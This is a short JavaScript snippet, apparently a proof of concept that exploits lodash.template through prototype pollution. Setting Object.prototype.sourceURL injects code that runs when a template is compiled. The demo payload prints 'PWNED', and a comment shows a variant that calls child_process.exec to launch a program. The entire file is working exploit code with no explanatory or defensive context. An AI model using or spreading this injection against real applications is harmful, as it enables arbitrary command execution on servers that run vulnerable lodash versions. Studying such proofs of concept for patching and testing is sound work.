const template = require('lodash.template')

Object.prototype.sourceURL = "\u2028\u2029\nconsole.log('PWNED')";  // global.process.mainModule.require('child_process').exec('calc')

template('Hello, <%= user.name %>!');
